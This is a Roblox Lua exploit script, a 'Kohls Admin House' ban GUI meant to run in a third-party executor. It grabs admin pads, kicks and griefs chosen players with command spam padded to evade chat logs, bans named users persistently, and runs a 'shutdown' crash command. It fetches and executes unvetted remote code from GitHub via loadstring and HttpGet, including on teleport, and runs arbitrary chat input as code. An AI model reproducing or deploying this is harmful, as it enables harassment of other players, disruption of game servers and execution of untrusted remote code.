game.Players.LocalPlayer:Kick("Patched until I replace the old hat with a new one. I have a working one but people are forcing me to gatekeep so")

local cons = {}
local prefix = "s!"
local antilog = string.rep(0, math.random(16, 100))
local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport or function() end
getgenv().autoexecute = true

if autoexecute then
    queueteleport('loadstring(game:HttpGet(("https://raw.githubusercontent.com/Tech-187/Lua-scripts/refs/heads/main/Ban%20GUI.lua"),true))()')
end

repeat task.wait() until game:IsLoaded()

local antimessage = true
local antiblind = true
local antipunish = true
local antikick = true

local rns = game:GetService("RunService")
local plrs = game:GetService("Players")
local getplrs = plrs:GetChildren()
local plr = plrs.LocalPlayer

local MarketplaceService = game:GetService("MarketplaceService")
local permpasses = (MarketplaceService:UserOwnsGamePassAsync(plr.UserId, 66254) or MarketplaceService:UserOwnsGamePassAsync(plr.UserId, 64354) or MarketplaceService:UserOwnsGamePassAsync(plr.UserId, 35748) or MarketplaceService:UserOwnsGamePassAsync(plr.UserId, 37127))
-- It doesn't automatically give u admin if u don't have any gamepasses because this is strongly based off of the original Ban GUI so ur gonna have to click the "Get Admin" button

local gameFlr = workspace.Terrain._Game
local adminFlr = gameFlr.Admin

function chatt(i) game.Players:Chat(i) end

local function antipunishh()
	if not permpasses then
		coroutine.wrap(function()
			while antipunish do task.wait()
				if game.Lighting:FindFirstChild(game.Players.LocalPlayer.Name) then
					game.Players.LocalPlayer.Character.Humanoid.Health = 0
					if not game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild(game.Players.LocalPlayer.Name .. "'s admin") then
						queueteleport([[repeat task.wait() until game:IsLoaded()

local gameFlr = workspace.Terrain._Game
local adminFlr = gameFlr.Admin
local padAbuse = true
local perm = true
local loopres = true
local lc = {}

local mousee = game.Players.LocalPlayer:GetMouse()
local unloop_keybind = "x"

mousee.KeyDown:connect(function(key)
    if key:lower() == unloop_keybind then
        padAbuse = false
        loopres = false
        for _, connection in ipairs(lc) do
            connection:Disconnect()
        end
    end
end)

task.spawn(function()
while task.wait() do
coroutine.wrap(function()
    if padAbuse == true then
        local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
        for i, pad in pairs(pads) do
            coroutine.wrap(function()
                pcall(function()
                    local cre = pad.Head
                    local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
                    firetouchinterest(cre, spr, 1)
                    firetouchinterest(cre, spr, 0)
                    firetouchinterest(cre, spr, 1)
                    task.wait()
                    firetouchinterest(cre, spr, 0)
                    
                    if pad.Name ~= game.Players.LocalPlayer.Name.."'s admin" then
                        fireclickdetector(adminFlr.Regen.ClickDetector, 0)
                    end
                end)
            end)()
        end
    end
end)()

coroutine.wrap(function() -- Perm
    local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
    if perm ~= true or adminFlr.Pads:FindFirstChild(game.Players.LocalPlayer.Name.."'s admin") ~= nil then 
    else
        pcall(function()
            local pad = adminFlr.Pads:FindFirstChild("Touch to get admin")
            local a = pad.Head
            firetouchinterest(a, spr, 1)
            firetouchinterest(a, spr, 0)
            firetouchinterest(a, spr, 1)
            task.wait()
            firetouchinterest(a, spr, 0)
        end)
    end
end)()
end
end)

wait(.35)

game.Players:Chat("respawn all")]])
						game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
					else
						chatt("reset me  ")
						chatt(":punish others")
    				end
    			end
    		end
    	end)()
    else
    	permap = true
        coroutine.wrap(function()
            while antipunish do
                if game.Lighting:FindFirstChild(game.Players.LocalPlayer.Name) then
                    chatt("unpunish me  ")
                    task.wait(.35)
                    chatt("unpunish me " )
                end
				task.wait(nil)
            end
        end)()
	end
end

if antipunish then
	antipunishh()
end

-- Objects

local Kohls = Instance.new("ScreenGui")
local MFrame = Instance.new("Frame")
local TFrame = Instance.new("Frame")
local Tiddle = Instance.new("TextLabel")
local Tutup = Instance.new("TextButton")
local Tunda = Instance.new("TextButton")
local Nama = Instance.new("TextBox")
local Ban = Instance.new("TextButton")
local Kick = Instance.new("TextButton")
local Madwe = Instance.new("TextLabel")
local Unlock = Instance.new("TextButton")
local Admin = Instance.new("TextButton")
local Noclip = Instance.new("TextButton")
local Data = Instance.new("TextBox")

-- Properties

Kohls.Name = "Kohls"
Kohls.Parent = game.CoreGui

MFrame.Name = "MFrame"
MFrame.Parent = Kohls
MFrame.Active = true
MFrame.BackgroundColor3 = Color3.new(0, 0, 0)
MFrame.BackgroundTransparency = 0.10000000149012
MFrame.BorderColor3 = Color3.new(0.333333, 1, 0)
MFrame.BorderSizePixel = 2
MFrame.Position = UDim2.new(0.138755977, 0, 0.139393941, 0)
MFrame.Size = UDim2.new(0, 497, 0, 289)
MFrame.Draggable = true

TFrame.Name = "TFrame"
TFrame.Parent = MFrame
TFrame.BackgroundColor3 = Color3.new(0, 0, 0)
TFrame.BorderColor3 = Color3.new(0, 1, 0)
TFrame.BorderSizePixel = 2
TFrame.Size = UDim2.new(0, 497, 0, 30)

Tiddle.Name = "Tiddle"
Tiddle.Parent = TFrame
Tiddle.BackgroundColor3 = Color3.new(1, 1, 1)
Tiddle.BackgroundTransparency = 1
Tiddle.Size = UDim2.new(0, 497, 0, 30)
Tiddle.Font = Enum.Font.SciFi
Tiddle.Text = "Kohls Admin House Gui"
Tiddle.TextColor3 = Color3.new(0.333333, 1, 0)
Tiddle.TextSize = 25

Tutup.Name = "Tutup"
Tutup.Parent = TFrame
Tutup.BackgroundColor3 = Color3.new(0, 0, 0)
Tutup.BorderColor3 = Color3.new(0.333333, 1, 0)
Tutup.BorderSizePixel = 2
Tutup.Position = UDim2.new(0.93664664, 0, 0, 0)
Tutup.Size = UDim2.new(0, 31, 0, 30)
Tutup.Font = Enum.Font.SciFi
Tutup.Text = "X"
Tutup.TextColor3 = Color3.new(0, 1, 0)
Tutup.TextSize = 25
Tutup.MouseButton1Down:connect(function()
	antipunish = false
	antikick = false
	PadCheck = false
	for _, connection in ipairs(cons) do
		connection:Disconnect()
	end
	Kohls:Destroy()
end)


Tunda.Name = "Tunda"
Tunda.Parent = TFrame
Tunda.BackgroundColor3 = Color3.new(0, 0, 0)
Tunda.BorderColor3 = Color3.new(0.333333, 1, 0)
Tunda.BorderSizePixel = 2
Tunda.Position = UDim2.new(0.875305355, 0, 0, 0)
Tunda.Size = UDim2.new(0, 31, 0, 30)
Tunda.Font = Enum.Font.SciFi
Tunda.Text = "-"
Tunda.TextColor3 = Color3.new(0, 1, 0)
Tunda.TextSize = 25

tunda = false

Tunda.MouseButton1Down:connect(function()
	if tunda == false then
		MFrame:TweenSize(UDim2.new(0, 497, 0, 27), "In", "Sine", 1, true)
		wait(1)
		Kick.Visible = false
		Ban.Visible = false
		Unlock.Visible = false
		Noclip.Visible = false
		Admin.Visible = false
		Nama.Visible = false
		Data.Visible = false
		Madwe.Visible = false
		tunda = true
	else
		MFrame:TweenSize(UDim2.new(0, 497, 0, 289), "In", "Sine", 1, true)
		wait(1)
		Kick.Visible = true
		Ban.Visible = true
		Unlock.Visible = true
		Noclip.Visible = true
		Admin.Visible = true
		Nama.Visible = true
		Data.Visible = true
		Madwe.Visible = true
		tunda = false
	end
end)

Nama.Name = "Name"
Nama.Parent = MFrame
Nama.BackgroundColor3 = Color3.new(0, 0, 0)
Nama.BorderColor3 = Color3.new(0.333333, 1, 0)
Nama.BorderSizePixel = 2
Nama.Position = UDim2.new(0.0824949667, 0, 0.138408303, 0)
Nama.Size = UDim2.new(0, 410, 0, 50)
Nama.Font = Enum.Font.SciFi
Nama.Text = "Nama Player / Player Name"
Nama.TextColor3 = Color3.new(0, 1, 0)
Nama.TextSize = 20

Ban.Name = "Ban"
Ban.Parent = MFrame
Ban.BackgroundColor3 = Color3.new(0, 0, 0)
Ban.BorderColor3 = Color3.new(0.333333, 1, 0)
Ban.BorderSizePixel = 2
Ban.Position = UDim2.new(0.145241275, 0, 0.356401384, 0)
Ban.Size = UDim2.new(0, 169, 0, 50)
Ban.Font = Enum.Font.SciFi
Ban.Text = "Banned"
Ban.TextColor3 = Color3.new(0, 1, 0)
Ban.TextSize = 25

Kick.Name = "Kick"
Kick.Parent = MFrame
Kick.BackgroundColor3 = Color3.new(0, 0, 0)
Kick.BorderColor3 = Color3.new(0.333333, 1, 0)
Kick.BorderSizePixel = 2
Kick.Position = UDim2.new(0.540145934, 0, 0.356401384, 0)
Kick.Size = UDim2.new(0, 169, 0, 50)
Kick.Font = Enum.Font.SciFi
Kick.Text = "Kick"
Kick.TextColor3 = Color3.new(0, 1, 0)
Kick.TextSize = 25

Madwe.Name = "Madwe"
Madwe.Parent = MFrame
Madwe.BackgroundColor3 = Color3.new(1, 1, 1)
Madwe.BackgroundTransparency = 1
Madwe.Position = UDim2.new(0, 0, 0.899653971, 0)
Madwe.Size = UDim2.new(0, 165, 0, 29)
Madwe.Font = Enum.Font.SciFi
Madwe.Text = "2024 Remaster"
Madwe.TextColor3 = Color3.new(0.333333, 1, 0)
Madwe.TextSize = 20

Unlock.Name = "Unlock"
Unlock.Parent = MFrame
Unlock.BackgroundColor3 = Color3.new(0, 0, 0)
Unlock.BorderColor3 = Color3.new(0.333333, 1, 0)
Unlock.BorderSizePixel = 2
Unlock.Position = UDim2.new(0.513078451, 0, 0.58477509, 0)
Unlock.Size = UDim2.new(0, 225, 0, 50)
Unlock.Font = Enum.Font.SciFi
Unlock.Text = "Unlock"
Unlock.TextColor3 = Color3.new(0, 1, 0)
Unlock.TextSize = 25

Admin.Name = "Admin"
Admin.Parent = MFrame
Admin.BackgroundColor3 = Color3.new(0, 0, 0)
Admin.BorderColor3 = Color3.new(0.333333, 1, 0)
Admin.BorderSizePixel = 2
Admin.Position = UDim2.new(0.0321931541, 0, 0.58477509, 0)
Admin.Size = UDim2.new(0, 225, 0, 50)
Admin.Font = Enum.Font.SciFi
Admin.Text = "Get Admin"
Admin.TextColor3 = Color3.new(0, 1, 0)
Admin.TextSize = 25

Noclip.Name = "Noclip"
Noclip.Parent = MFrame
Noclip.BackgroundColor3 = Color3.new(0, 0, 0)
Noclip.BorderColor3 = Color3.new(0.333333, 1, 0)
Noclip.BorderSizePixel = 2
Noclip.Position = UDim2.new(0.619718313, 0, 0.795847774, 0)
Noclip.Size = UDim2.new(0, 172, 0, 41)
Noclip.Font = Enum.Font.SciFi
Noclip.Text = "Noclip"
Noclip.TextColor3 = Color3.new(0, 1, 0)
Noclip.TextSize = 25

Data.Name = "Data"
Data.Parent = MFrame
Data.BackgroundColor3 = Color3.new(0, 0, 0)
Data.BorderColor3 = Color3.new(0.333333, 1, 0)
Data.BorderSizePixel = 2
Data.Position = UDim2.new(0.372233391, 0, 0.795847774, 0)
Data.Size = UDim2.new(0, 112, 0, 50)
Data.Font = Enum.Font.SciFi
Data.Text = "Data Unlocked"
Data.TextColor3 = Color3.new(0.333333, 1, 0)
Data.TextScaled = true
Data.TextSize = 14
Data.TextWrapped = true

-- Scripts

Admin.MouseButton1Down:connect(function()
	local function GetPad(msg)
		while PadCheck == true do
			task.wait(0)
			if not game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild(game.Players.LocalPlayer.Name .. "'s admin") then
				if game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin") then
					local pad = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin"):FindFirstChild("Head")
					local padCFrame = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin"):FindFirstChild("Head").CFrame
					task.wait(0.125)
					pad.CanCollide = false
					repeat task.wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
					pad.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
					task.wait(0.125)
					pad.CFrame = padCFrame
					pad.CanCollide = true
				else
					fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector, 0)
				end
			end
		end
	end
	
	PadCheck = true
	GetPad(msg)
end)

noclip = false
game:GetService('RunService').Stepped:connect(function()
	if noclip then
		chatt("iyc noclip fuck")
		Noclip.Text = "Noclip (Active)"
	end
end)
Noclip.MouseButton1Down:connect(function()
	noclip = not noclip
	chatt("iyc clip fuck")
	Noclip.Text = "Noclip"
end)

Unlock.MouseButton1Down:connect(function()
	for i, v in pairs(game.Workspace:GetDescendants()) do
		if v:IsA("Part") then
			v.Locked = false
			print("Unlocked" .. v.Name)
			Data.Text = "Unlocked" .. v.Name
			-- yeah Idk what to do with this so
			loadstring(game:HttpGet(("https://raw.githubusercontent.com/T3chn0w1thth4t/scripts-cheats-2/main/Protected%20-%202022-04-06T212947.046.lua"),true))() -- very old delete tool script that I lost the source of
		end
	end
end)

function GetPlayer(plrname)
	for _, player in pairs(game.Players:GetPlayers()) do
		if plrname:lower() == player.Name:sub(1, plrname:len()):lower() then
			return player
		end
	end
	return nil
end

function GetPlayer2(gplr) -- Alternative
	for i, v in pairs(game.Players:GetPlayers()) do
		if string.sub(v.Name:lower(), 1, #gplr) == gplr then
			target = v.Name
		end
	end
end

getgenv().ggBanned = { { "h", "SlenderMan990921" } } -- h aka hat is currently the only method

Ban.MouseButton1Down:connect(function()
	local target2 = GetPlayer(Nama.Text)
	if target2 then
		chatt(prefix.."kick "..Nama.Text)
		Nama.Text = "Banned ! Player Name :" .. target2.Name
		print('Banned ! Player Name : ', Nama.Text)
		table.insert(ggBanned, { "h", target2.Name })
		appendfile("banguibanned.txt", target2.Name.."\n")
		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/mute "..target,"all")
	end
end)

Kick.MouseButton1Down:connect(function()
	local target2 = GetPlayer(Nama.Text)
	if target2 then
		chatt(prefix.."kick "..Nama.Text)
		Nama.Text = "Kicked ! Player Name :" .. target2.Name
		print("Kicked ! Player Name: ", Nama.Text)
	end
end)

if not isfile("banguibanned.txt") then
	writefile("banguibanned.txt", "In here will just be a list of banned users \n Please keep in mind that some users able to bypass this ban but it's not really common \n\n\n")
end

task.spawn(function()
    while antikick do task.wait()
        for i,v in pairs(workspace:GetDescendants()) do
            if v:IsA("Accessory") then
                if tostring(v.AccessoryType) == "Enum.AccessoryType.Unknown" then -- kneekirs
                    v:Destroy()
                end
            end
        end
    end
end)

--//   PlayerAdded Hook   //--
cons[#cons + 1] = plrs.PlayerAdded:Connect(function(plr)
	task.spawn(function()
		wait(.65) -- without this it might be too early
		for i,t in ipairs(ggBanned) do
			if t[1] == "h" and plr.Name == t[2] then
				chatt(prefix.."kick "..plr.Name)
			end
		end
	end)
end)

cons[#cons + 1] = game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if string.sub(msg, 0, 3 + #prefix) == prefix.."lua" then
		local code = string.sub(msg, 5 + #prefix)
        loadstring(code)()
	elseif string.sub(msg, 0, 8 + #prefix) == prefix.."shutdown" then
		loadstring(game:HttpGet(("https://raw.githubusercontent.com/Tech-187/Lua-scripts/main/scv3-var's%20usilcrash"),true))()
		if debounce1 then return end
		getgenv().debounce1 = true
            task.delay(1.5, function()
                getgenv().debounce1 = false
            end)
	elseif string.sub(msg, 0, 4 + #prefix) == prefix.."kick" then
		if debounce1 then return end
            getgenv().debounce1 = true
            task.delay(5, function() -- Incrased the debounce to 5 seconds, incase someone spams the kick GUI button
                getgenv().debounce1 = false
            end)
		GetPlayer2(string.sub(msg, 6 + #prefix))
		spammer = true
		chatt("respawn "..target)
		chatt("blind "..target.."                                                                                                                                                                      fuck") -- fuck is added at the end so the command is tagged in peoples clogs. That prevents logging, as well as the double chat bug
		chatt("invis "..target.."                                                                                                                                                                      fuck")
		chatt("skydive "..target.." "..target.." "..target.."                                                                                                                                                                      fuck")
		chatt("skydive "..target.." "..target.." "..target.."                                                                                                                                                                      fuck")
		chatt("skydive "..target.." "..target.." "..target.."                                                                                                                                                                      fuck")
		chatt("size "..target.." 9.9")
		chatt("size "..target.." 9.9")
		chatt("spin MeansSpiderInDutch                                                                                                                                                                        "..target.." fuck")
		if not permpasses then 
			wait(0.35)
		end
		pcall(function()
			fireclickdetector(adminFlr.Regen.ClickDetector, 0)
		end)
		wait(0.15)
		chatt("setgrav "..target.." -251.2")
		task.delay(3.65, function()
			spammer = false
		end)
		for i = 1, 103 do
			chatt("hat "..target.." "..antilog.."REPLACETHIS")
		end
		while spammer do task.wait()
			chatt("hat "..target.." "..antilog.."REPLACETHIS")
		end
	end
end)

cons[#cons + 1] = rns.RenderStepped:Connect(function()
    if antiblind == true then
        for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
            if v.Name == "EFFECTGUIBLIND" then
                v:Destroy()
            end
        end
    end
    if antimessage == true then
        for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
            if v.Name == "MessageGUI" or v.Name == "Message" or v.Name == "HintGUI" then
                v:Destroy()
            end
        end
        for i, v in pairs(game.Workspace.Terrain["_Game"].Folder:GetDescendants()) do
            if v.Name == "Message" then
                v:Destroy()
            end
        end
    end
end)

local file = readfile("banguibanned.txt")
for plr in file:gmatch("[^\r\n]+") do
    table.insert(ggBanned, { "h", plr })
end
